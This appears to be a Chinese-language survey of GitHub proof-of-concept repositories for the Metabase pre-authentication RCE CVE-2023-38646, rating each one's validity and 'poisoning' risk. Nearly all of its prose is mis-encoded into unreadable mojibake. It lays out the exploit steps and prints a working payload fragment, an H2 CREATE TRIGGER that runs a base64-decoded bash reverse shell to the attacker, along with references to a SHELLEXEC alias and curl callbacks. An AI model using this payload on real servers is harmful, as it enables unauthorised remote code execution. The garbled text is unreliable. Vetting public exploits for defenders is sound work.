**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒé€šè¿‡ä»¥ä¸‹æ­¥éª¤åˆ©ç”¨æ¼æ´ï¼š
1.  è·å– setup-token, ç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  æ„é€ åŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ POST è¯·æ±‚ï¼Œå‘é€åˆ° /api/setup/validate æ¥å£ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª SQL è§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® INFORMATION_SCHEMA.TABLES æ—¶æ‰§è¡Œä»»æ„çš„ base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  æ‰§è¡Œçš„å‘½ä»¤æ˜¯åå¼¹shellï¼Œå°†ç›®æ ‡æœåŠ¡å™¨çš„ shell é‡å®šå‘åˆ°æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©ï¼š**
ä»“åº“ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚ä¸»è¦é£é™©æ¥è‡ªäºï¼š
1.  `add_padding`å‡½æ•°ï¼šè¿™ä¸ªå‡½æ•°çœ‹ä¼¼æ˜¯ä¸ºäº†æ¶ˆé™¤ base64 ç¼–ç åçš„ç­‰å·ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æ­¤å‡½æ•°æ¥æ’å…¥æ¶æ„ä»£ç ï¼Œè™½ç„¶å½“å‰çš„ç›®çš„æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›è¿‡æ»¤æœºåˆ¶ï¼Œä½†å­˜åœ¨è¢«æ»¥ç”¨çš„é£é™©ï¼Œé€šè¿‡ä¿®æ”¹payloadæ„é€ è¿‡ç¨‹æ¤å…¥æ¶æ„ä»£ç ã€‚
2.  åå¼¹ Shell çš„IPå’Œç«¯å£æ˜¯ç”¨æˆ·æŒ‡å®šçš„ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…æ— æ³•é€šè¿‡ç›´æ¥ä¿®æ”¹ä»£ç æ¥æ¤å…¥åé—¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æ¼æ´å®šä½ï¼š** æ¼æ´å­˜åœ¨äºMetabaseçš„å®‰è£…è®¾ç½®é˜¶æ®µï¼Œå…·ä½“ä½äº`api/setup/validate`æ¥å£ã€‚
2.  **è·å–Tokenï¼š** é€šè¿‡è®¿é—®`/api/session/properties`è·å–`setup-token`ï¼Œè¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚
3.  **æ„é€ Payloadï¼š**  æ ¸å¿ƒåœ¨äºæ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä»¥ä¸‹å…³é”®éƒ¨åˆ†ï¼š
    *   `zip:/app/metabase.jar!/sample-database.db`ï¼šæŒ‡å®šæ•°æ®åº“æ–‡ä»¶çš„ä½ç½®ã€‚
    *   `MODE=MSSQLServer`ï¼šè®¾ç½®æ•°æ®åº“æ¨¡å¼ä¸ºMSSQLServerï¼Œè¿™æ˜¯è§¦å‘æ¼æ´çš„å¿…è¦æ¡ä»¶ã€‚
    *   `TRACE_LEVEL_SYSTEM_OUT=1`ï¼šå¯ç”¨ç³»ç»Ÿè¾“å‡ºè·Ÿè¸ªã€‚
    *   `CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x`ï¼šåˆ›å»ºä¸€ä¸ªåä¸º`pwnshell`çš„è§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢`INFORMATION_SCHEMA.TABLES`è¡¨ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä½¿ç”¨ JavaScript è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œåå¼¹shellå‘½ä»¤ã€‚`{payload}`ä¼šè¢«æ›¿æ¢ä¸ºbase64ç¼–ç åçš„åå¼¹shellå‘½ä»¤ï¼Œå…¶ä¸­åˆ©ç”¨äº†bashçš„ç‰¹æ€§è¿›è¡Œè§£ç å’Œæ‰§è¡Œã€‚
4.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ å¥½çš„åŒ…å«payloadçš„JSONæ•°æ®ï¼Œé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`æ¥å£ã€‚
5.  **æ‰§è¡Œå‘½ä»¤ï¼š**  å½“Metabaseå°è¯•è¿æ¥åˆ°æ¶æ„æ„é€ çš„æ•°æ®åº“æ—¶ï¼Œè§¦å‘å™¨è¢«æ‰§è¡Œï¼Œä»è€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [j0yb0y0h/CVE-2023-38646](https://github.com/j0yb0y0h/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #21

**æ¥æº**: [CVE-2023-38646-junnythemarksman_CVE-2023-38646.md](../2023/CVE-2023-38646-junnythemarksman_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­å­˜åœ¨çš„ä¸€ä¸ªæ— éœ€è®¤è¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡å‘é€ç‰¹åˆ¶çš„ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨ `subname` å­—æ®µä¸­æ³¨å…¥æ¶æ„çš„ JDBC URLã€‚è¯¥URLåŒ…å«ä¸€ä¸ªCREATE TRIGGERè¯­å¥ï¼Œè¯¥è¯­å¥åœ¨INFORMATION_SCHEMA.TABLESè¡¨ä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æä¾›ä¸€ä¸ªåŒ…å«åå¼¹shellå‘½ä»¤çš„payloadï¼Œè¯¥å‘½ä»¤ä¼šè¢«base64ç¼–ç åæ‰§è¡Œã€‚æ¼æ´åˆ©ç”¨ä»£ç ä¸­çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¸»è¦æ˜¯é€šè¿‡ç¯¡æ”¹IPå’Œç«¯å£è¿›è¡Œæ¶æ„è¿æ¥ï¼Œå­˜åœ¨å°‘é‡é£é™©ã€‚ è„šæœ¬è¦æ±‚ç”¨æˆ·æŒ‡å®šç›®æ ‡ URL å’Œ tokenï¼Œ token é€šè¿‡ `/api/session/properties` è·å–ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  è·å–ç›®æ ‡ Metabase å®ä¾‹çš„ URL å’Œ tokenï¼ˆé€šè¿‡è®¿é—® `/api/session/properties` è·å–ï¼‰ã€‚
2.  é…ç½®æ¼æ´åˆ©ç”¨è„šæœ¬ `exploit.py`ï¼Œè®¾ç½®ç›®æ ‡ URLã€tokenã€æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚
3.  è¿è¡Œè„šæœ¬ï¼Œè„šæœ¬å°†å‘é€åŒ…å«æ¶æ„ JDBC URL çš„ POST è¯·æ±‚åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚
4.  ç›®æ ‡ Metabase å®ä¾‹æ‰§è¡Œæ¶æ„ä»£ç ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å’Œå‘é€æ¶æ„è¯·æ±‚ï¼Œè™½ç„¶å­˜åœ¨é€šè¿‡ä¿®æ”¹IPç«¯å£è¿›è¡Œæ¶æ„è¿æ¥çš„é£é™©ï¼Œ ä½†æ˜¯éœ€è¦ä½¿ç”¨è€…è‡ªè¡Œé…ç½®ã€‚æ‰€ä»¥æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [junnythemarksman/CVE-2023-38646](https://github.com/junnythemarksman/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #22

**æ¥æº**: [CVE-2023-38646-kh4sh3i_CVE-2023-38646.md](../2023/CVE-2023-38646-kh4sh3i_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseçš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå­˜åœ¨äº0.46.6.1ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ1.46.6.1ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ä¸­ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„HTTPè¯·æ±‚åˆ°/api/setup/validateç«¯ç‚¹ï¼Œå…¶ä¸­åŒ…å«æ¶æ„æ„é€ çš„JSON payloadã€‚è¯¥payloadåˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE ALIAS`è¯­å¥åˆ›å»ºä¸€ä¸ªåä¸º`SHELLEXEC`çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚PoCä»£ç é€šè¿‡curlå‘½ä»¤å›è¿æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ŒéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚è™½ç„¶POCä¸­ä½¿ç”¨äº†curlè¿›è¡Œå›è¿ï¼Œä½†æ”»å‡»è€…å¯ä»¥æ›¿æ¢æˆä»»ä½•å‘½ä»¤è¿›è¡Œæ¶æ„åˆ©ç”¨ã€‚æŠ•æ¯’é£é™©è¾ƒä½ï¼Œåªæœ‰æå°çš„å¯èƒ½æ€§ä½œè€…åœ¨ä»£ç ä¸­æ¤å…¥å…¶ä»–æ¶æ„ä»£ç ï¼ˆæ¯”å¦‚åœ¨LICENSEæ–‡ä»¶ä¸­éšè—ä¸å¯è§å­—ç¬¦ï¼‰ï¼Œä½†è¿™å¯ä»¥é€šè¿‡ä»”ç»†å®¡æŸ¥ä»£ç æ¥é¿å…ã€‚PoCä»£ç ä¸»è¦é€šè¿‡H2æ•°æ®åº“çš„ç‰¹æ€§æ‰§è¡Œä»»æ„ä»£ç ï¼ŒLICENSEæ–‡ä»¶ä¸»è¦å£°æ˜äº†ç‰ˆæƒåè®®ã€‚

**é¡¹ç›®åœ°å€:** [kh4sh3i/CVE-2023-38646](https://github.com/kh4sh3i/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #23

**æ¥æº**: [CVE-2023-38646-nickswink_CVE-2023-38646.md](../2023/CVE-2023-38646-nickswink_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚å¤šä¸ªèµ„æºç¡®è®¤äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œä¸¥é‡æ€§ã€‚

æä¾›çš„ PoC ä»£ç  `exploit.py` å°è¯•åˆ©ç”¨æ­¤æ¼æ´ã€‚å®ƒé¦–å…ˆè·å– Metabase å®ä¾‹çš„ `setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚Payloadä½¿ç”¨base64ç¼–ç åå¼¹shellå‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š**  PoC è„šæœ¬é¦–å…ˆå‘ç›®æ ‡ Metabase å®ä¾‹çš„ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œè§£æè¿”å›çš„ JSON æ•°æ®ä»¥æå– `setup-token`ã€‚æ­¤ token ç”¨äºåç»­çš„æ¼æ´åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š**  è¯¥è„šæœ¬æ„é€ ä¸€ä¸ª JSON payloadï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT=1` å’Œ `CREATE TRIGGER` ç­‰ H2 ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  **å‘é€ Payloadï¼š**  è„šæœ¬å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚æˆåŠŸåˆ©ç”¨åï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ payload ä¸­çš„å‘½ä»¤ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…çš„æœºå™¨ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

PoC ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå¹¶æ— æ˜æ˜¾çš„æ¶æ„æŠ•æ¯’ä»£ç ï¼Œä½†æ˜¯ä»å­˜åœ¨ä¸€å®šçš„é£é™©, å› ä¸ºPoC æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ”»å‡»è€…å¯ä»¥æ›¿æ¢åå¼¹shellçš„payloadä¸ºæ¶æ„payload,ä¾‹å¦‚åˆ é™¤æœåŠ¡å™¨æ•°æ®ï¼Œå› æ­¤æŠ•æ¯’é£é™©å­˜åœ¨ï¼Œé¢„ä¼°æ¯”ä¾‹ä¸º5%ã€‚æ­¤è¯„ä¼°åŸºäºä»£ç æœ¬èº«ï¼Œä¸åŒ…æ‹¬ä»£ç æ‰˜ç®¡å¹³å°å¯èƒ½å­˜åœ¨çš„é£é™©ï¼Œå¦‚è´¦å·è¢«ç›—ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [nickswink/CVE-2023-38646](https://github.com/nickswink/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #24

**æ¥æº**: [CVE-2023-38646-passwa11_CVE-2023-38646.md](../2023/CVE-2023-38646-passwa11_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæˆæƒçš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1, < 1.46.6.1 (åŠå…¶ä»–ä¿®å¤ç‰ˆæœ¬è§æ¼æ´åº“ä¿¡æ¯)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚ä¿®å¤ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆé€šè¿‡è®¿é—® `/api/session/properties` ç«¯ç‚¹è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ JSON payloadã€‚è¯¥ payload åˆ©ç”¨ H2 æ•°æ®åº“çš„ä¸€ä¸ªç‰¹æ€§ï¼Œé€šè¿‡åˆ›å»ºè§¦å‘å™¨åœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚è¯¥ JavaScript ä»£ç ä¼šæ‰§è¡Œ bash å‘½ä»¤ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **å‘é€ Payloadï¼š** æ”»å‡»è€…å°†æ„é€ çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚åˆ©ç”¨ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç ï¼Œç»•è¿‡æ£€æµ‹ã€‚

**POC ä»£ç æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç ä¼¼ä¹æœ‰æ•ˆï¼Œå› ä¸ºå®ƒå®ç°äº†ä¸Šè¿°åˆ©ç”¨è¿‡ç¨‹ã€‚å®ƒé¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªåŒ…å«åå‘ shell å‘½ä»¤çš„ payloadï¼Œå¹¶å°†å…¶å‘é€åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥å­˜å‚¨åº“çš„ä¸»è¦ä»£ç æ–‡ä»¶æ˜¯ `exploit.py`ã€‚ä»”ç»†æ£€æŸ¥æ­¤æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨ CVE-2023-38646 æ¼æ´ï¼Œå…è®¸è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ ä½†æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä½œè€…å¦‚æœå°†åå¼¹shellçš„IPæˆ–è€…ç«¯å£å†™æ­»ï¼Œå°±æœ‰å¯èƒ½è¢«ä½œè€…æ§åˆ¶ã€‚
`README.md` æ–‡ä»¶ä»…åŒ…å«æœ‰å…³æ¼æ´å’Œä½¿ç”¨è„šæœ¬çš„è¯´æ˜ã€‚å®ƒè¿˜åŒ…å«å¯¹åŸå§‹æ¼æ´å‘ç°å’Œç›¸å…³æ¼æ´åˆ©ç”¨çš„ credit é“¾æ¥ï¼Œè¿™è¡¨æ˜ä½œè€…æ²¡æœ‰è¯•å›¾éšè—è„šæœ¬çš„ç›®çš„ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [passwa11/CVE-2023-38646](https://github.com/passwa11/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #25

**æ¥æº**: [CVE-2023-38646-securezeron_CVE-2023-38646.md](../2023/CVE-2023-38646-securezeron_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** ç¬¬ä¸€ä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-POC.py`ï¼‰ç”¨äºè·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚å®ƒå°è¯•é€šè¿‡HTTPå’ŒHTTPSè¿æ¥åˆ°ç›®æ ‡IPåœ°å€ï¼Œå¹¶è¯·æ±‚`/api/session/properties`ç«¯ç‚¹ï¼Œè§£æè¿”å›çš„JSONæ•°æ®ï¼Œä»ä¸­æå–`setup-token`ã€‚
2.  **åˆ©ç”¨Setup Tokenæ‰§è¡Œå‘½ä»¤ï¼š** ç¬¬äºŒä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-Reverse-Shell.py`ï¼‰åˆ©ç”¨è·å–åˆ°çš„Setup Tokenï¼Œå‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®ã€‚è¯¥é…ç½®ä½¿ç”¨H2æ•°æ®åº“å¼•æ“ï¼Œå¹¶åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ³¨å…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨`pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œä¹‹å‰è§¦å‘ï¼Œä»è€Œæ‰§è¡ŒBase64ç¼–ç çš„payloadï¼Œpayloadè§£ç åæ‰§è¡Œåå‘shellå‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

ä»æä¾›çš„æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’ŒPOCä»£ç æ¥çœ‹ï¼Œè¯¥æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æœç´¢ç»“æœä¸­åŒ…å«äº†å¤šä¸ªå…³äºæ­¤æ¼æ´çš„æè¿°ã€åˆ©ç”¨æ–¹æ³•ä»¥åŠPOCä»£ç çš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

*   ç¬¬ä¸€ä¸ªè„šæœ¬`CVE-2023-38646-POC.py`åªæ˜¯ç”¨æ¥è·å–setup tokenï¼Œæœ¬èº«ä¸åŒ…å«ä»»ä½•æ¶æ„ä»£ç ã€‚
*   ç¬¬äºŒä¸ªè„šæœ¬`CVE-2023-38646-Reverse-Shell.py`åŒ…å«åå‘shellçš„payloadï¼Œè¿™éƒ¨åˆ†æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆï¼Œä¸èƒ½ç®—ä½œæŠ•æ¯’ä»£ç ã€‚å¯èƒ½çš„æŠ•æ¯’é£é™©åœ¨äºï¼š
    *   **Payloadæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼š** è™½ç„¶å½“å‰Payloadæ˜¯åå‘shellï¼Œä½†æ”»å‡»è€…å¯èƒ½ä¿®æ”¹Payloadï¼Œæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼Œæ¯”å¦‚æ•°æ®çªƒå–ã€å‹’ç´¢è½¯ä»¶ç­‰ã€‚
    *   **ä¾èµ–é¡¹é£é™©ï¼š** è„šæœ¬ä¾èµ–requestsåº“ï¼Œå¦‚æœrequestsåº“æœ¬èº«è¢«æŠ•æ¯’ï¼Œå¯èƒ½å¼•å…¥å®‰å…¨é£é™©ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªè„šæœ¬æœ¬èº«ï¼Œæ¯”å¦‚åå‘shell çš„IPåœ°å€ã€ç«¯å£è¢«æ›¿æ¢æˆæ”»å‡»è€…æ§åˆ¶çš„è‚‰é¸¡ä»è€Œè¿›è¡Œè·³æ¿æ”»å‡»ï¼Œä»¥åŠå®‰è£…æ¶æ„ä¾èµ–é¡¹çš„å¯èƒ½ã€‚

